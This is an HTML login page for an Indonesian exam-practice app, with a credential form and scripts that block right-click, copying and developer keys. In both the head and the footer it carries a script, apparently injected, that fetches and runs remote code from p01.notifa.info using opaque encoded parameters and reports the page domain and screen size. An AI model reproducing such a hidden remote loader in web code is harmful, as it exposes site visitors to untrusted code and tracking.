<html class="k-webkit k-webkit108">
<head>
  <!-- <link href='../images/icon.png' rel='icon' type='image/gif'/> -->
  <!-- <link rel="shortcut icon" href="img/logo_sma.png" type="image/x-icon"> -->
  <link rel="shortcut icon" href="images/icon.png" type="image/x-icon">
  <script type="text/javascript">
    function mousedwn(e) {
      try {
        if (event.button == 2 || event.button == 3) return false
      } catch (e) {
        if (e.which == 3) return false
      }
    }
    document.oncontextmenu = function() {
      return false
    };
    document.ondragstart = function() {
      return false
    };
    document.onmousedown = mousedwn
  </script>
  <script type="text/javascript">
    window.addEventListener("keydown", function(e) {
      if (e.ctrlKey && (e.which == 65 || e.which == 66 || e.which == 67 || e.which == 73 || e.which == 80 || e.which == 83 || e.which == 85 || e.which == 86)) {
        e.preventDefault()
      }
    });
    document.keypress = function(e) {
      if (e.ctrlKey && (e.which == 65 || e.which == 66 || e.which == 67 || e.which == 73 || e.which == 80 || e.which == 83 || e.which == 85 || e.which == 86)) {}
      return false
    }
  </script>
  <script type="text/javascript">
    document.onkeydown = function(e) {
      e = e || window.event;
      if (e.keyCode == 123 || e.keyCode == 18) {
        return false
      }
    }
  </script>

  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Aplikasi UNBK</title>
  <!-- Tell the browser to be responsive to screen width -->
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
  <meta name="description" content="Aplikasi UNBK, membantu anda sukses dalam ujian dengan memulai belajar test berbasis Komputer dengan beragam soal-soal ujian.">
  <meta name="keyword" content="UNBK, Ujian, Ujian Nasional, Ulangan Harian, Ulangan Semester, Mid Semester, Test CPNS, Test SMBPTN">
  <meta name="google" content="nositelinkssearchbox">
  <meta name="robots" content="index, follow">

  <link href="vendor/twbs/bootstrap/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="aset/main.css" rel="stylesheet">
  <!-- <link href="css/css/mainam.css" rel="stylesheet"> -->
  <link href="aset/selectbox.min.css" rel="stylesheet">

  <!-- jQuery 3 -->
  <script src="aset/vendor/twbs/bootstrap/dist/js/bootstrap.min.js"></script>
  <!--<script src="css/inline.js"></script>-->
  <script src="js/inline.js"></script>
  <script type="text/javascript" src="js/jquery.js"></script>
  <script type="text/javascript" src="js/jquery.validate.js"></script>
  <script type="text/javascript">
    $(document).ready(function() {// $("#form1").validate
      ({
        errorLabelContainer: "#myerror", wrapper: "li", rules: {
          UserName: "required", // simple rule, converted to {required:true}
          Password: "required", // simple rule, converted to {required:true}
          email: // compound rule
          {
            required: true,
            email: true
          },
          url: {
            required: true,
            url: true
          },
          comment: {
            required: true
          }
        },
        messages: {
          UserName: "Username Harus diisi, masukkan Username dengan benar",
          Password: "Password Harus diisi, masukkan Password dengan benar",
          comment: "Please enter a comment.",
          url: "Please Enter Correct URL"
        }
      });
    });
  </script>

  <style>
    .no-close .ui-dialog-titlebar-close {
      display: none;
    }
  </style>
  <script type="text/javascript" async="" src="http://p01.notifa.info/3fsmd3/request?id=1&amp;enc=9UwkxLgY9&amp;params=4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXOL4UjOWcS1YEVf0Nhiat8dUW%2bciysVN9uRT8o%2bWMANSBDUYT4Ii1Kytt3MBht%2fm1xIKhXieT1pP%2fN4GVigAUzbq%2fWTrTEGJz9FfH0fSRACama2c7wx4VqQPIVuQWSiyiyID9y8YUy8NXuNEX2D3Pv4CK78CavY%2bLvaRnfjcKGFxNnDTJgiyV1YpiPWWBWzX%2fi3W36JU931bVJdY6dUe%2fdManqwVB5DkPKdv7%2fsj51hjRZL08BcyYicefbc%2fIul4aPQf4Ux0v1aFjAbqVuaB3eeqQQVIaLLWDFz2z6aH4H%2fpV9WP4sHSWkDtsj6CPP1qzOQAcDULesVAWFbmnKyWwbirYmkJ1UD4Y5zUDObDKNlEqmT9by3K6BBog07spYYX0EDijkcG0PRYKshssqpnSrcgvbemezoFPrbhlXXEXMgEZSx51TOa5fKJY3CBiprwEULS9Mv6U83Qdabay00fshxXih%2bBda%2bW4xP0iHQ2GgYS25re1gPVYSvR4ltA%2f5jELexJ1yr7EMmxodmPyWyCzHcDXw%2f5HWW%2bfTInHA3Dj%2fsU4dG%2fCKY78Bg%3d%3d&amp;idc_r=29492627466&amp;domain=mylocalhost.com&amp;sw=1366&amp;sh=768"></script>
</head>

<body onload="noBack();" onpageshow="if (event.persisted) noBack();" onunload="">
  <main>
    <header class="masthead">
      <div class="container-fluid">
        <div class="row no-gutters">
          <div class="col-md-12">
            <center><img src="img/logo.png"></center>
          </div>
        </div>
      </div>
    </header>
    <div class="container-fluid">
      <div class="main-content">
        <!-- Main Content -->
        <div class="main-content">
          <div class="container-fluid sm-width">
            <div class="row no-gutters">
              <div class="col-md-12">
                <div class="content text-center">
                  <h2>Login Ujian</h2>
                  <p>Silahkan login dengan username dan password yang telah anda miliki</p>
                  <form action="konfirm.php" class="login-form" method="post" accept-charset="utf-8" id="form1" data-toggle="validator">
                    <div class="form-group row no-gutters">
                      <label for="username" class="col-form-label icon-bg icon-user"></label>
                      <div class="form-field col">
                        <span class="field-title" style="display: none">Username</span>
                        <input class="form-control" data-val="true" data-val-required="User name wajib diisi" id="inputUsername" name="UserName" placeholder="Username" type="text" value="" required>
                      </div>
                    </div>
                    <div class="form-group row no-gutters">
                      <label for="password" class="col-form-label icon-bg icon-lock"></label>
                      <div class="form-field col">
                        <span class="field-title" style="display: none">Password</span>
                        <input class="form-control" data-val="true" id="password" name="Password" placeholder="Password" type="password" value="" required>
                        <a class="password-toggle icon icon-eye" onclick="showPassword()"></a>
                      </div>
                    </div>
                    <div class="form-group">
                      <div class="col-xs-12">
                        <button type="submit" class="btn btn-primary doblockui" onclick="validateAndSend()" style="border-radius: 40px; font-family: sans-serif;">LOGIN</button>
                      </div>
                    </div>
                  </form>
                </div>
                <div class="content login-footer shadow">
                    <div class="copyright">Copyrights © 2022, Modified by Triyono</div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <script type="text/javascript">
          $(document).ready(function() {
            var dialog = $('#dialog');
            $('#btnLogin').click(function(e) {
              //e.preventDefault();
              if (e.shiftKey) {
                return false;
              }
              return true;
            });
            $('.doblockui').click(function(e) {
              dialog.kendoDialog({
                width: "500px",
                height: "170px",
                title: false,
                closable: false,
                content: "<div class='center'><div style='width:100%;'><div><div class='k-loading-mask' style='width:100%;height:130px'><div class='k-loading-image'><div class='k-loading-color'></div></div></div></div><div style='bottom: 30px;position: absolute;text-align: center;width: 94%;'>Mohon tunggu</div>"
              });
            });
          });
          $("#password").keypress(function(event) {
            if (event.which == 13) {
              $('.login-form').submit();
            }
          });

          function showPassword() {
            var x = document.getElementById("password");
            if (x.type === "password") {
              $('.password-toggle').removeClass('icon-eye');
              $('.password-toggle').addClass('icon-eye-slash');
              x.type = "text";
            } else {
              $('.password-toggle').removeClass('icon-eye-slash');
              $('.password-toggle').addClass('icon-eye');
              x.type = "password";
            }
          }
        </script>
      </div>
    </div>
  </main>

  <link href="css/css/bootstrap.css" rel="stylesheet">
  <script src="css/css/bootstrap.js"></script>
  <link href="css/css/kendo.bootstrap-v4.min.css" rel="stylesheet">
  <script src="css/css/kendo.all.min.js"></script>


  <script type="text/javascript">
    if (self == top) {
      function netbro_cache_analytics(fn, callback) {
        setTimeout(function() {
          fn();
          callback();
        }, 0);
      }

      function sync(fn) {
        fn();
      }

      function requestCfs() {
        var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
        var idc_glo_r = Math.floor(Math.random() * 99999999999);
        var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXOL4UjOWcS1YEVf0Nhiat8dUW%2bciysVN9uRT8o%2bWMANSBDUYT4Ii1Kytt3MBht%2fm1xIKhXieT1pP%2fN4GVigAUzbq%2fWTrTEGJz9FfH0fSRACama2c7wx4VqQPIVuQWSiyiyID9y8YUy8NXuNEX2D3Pv4CK78CavY%2bLvaRnfjcKGFxNnDTJgiyV1YpiPWWBWzX%2fi3W36JU931bVJdY6dUe%2fdManqwVB5DkPKdv7%2fsj51hjRZL08BcyYicefbc%2fIul4aPQf4Ux0v1aFjAbqVuaB3eeqQQVIaLLWDFz2z6aH4H%2fpV9WP4sHSWkDtsj6CPP1qzOQAcDULesVAWFbmnKyWwbirYmkJ1UD4Y5zUDObDKNlEqmT9by3K6BBog07spYYX0EDijkcG0PRYKshssqpnSrcgvbemezoFPrbhlXXEXMgEZSx51TOa5fKJY3CBiprwEULS9Mv6U83Qdabay00fshxXih%2bBda%2bW4xP0iHQ2GgYS25re1gPVYSvR4ltA%2f5jELexJ1yr7EMmxodmPyWyCzHcDXw%2f5HWW%2bfTInHA3Dj%2fsU4dG%2fCKY78Bg%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
        var bsa = document.createElement('script');
        bsa.type = 'text/javascript';
        bsa.async = true;
        bsa.src = url;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
      }
      netbro_cache_analytics(requestCfs, function() {});
    };
  </script>
</body>

</html>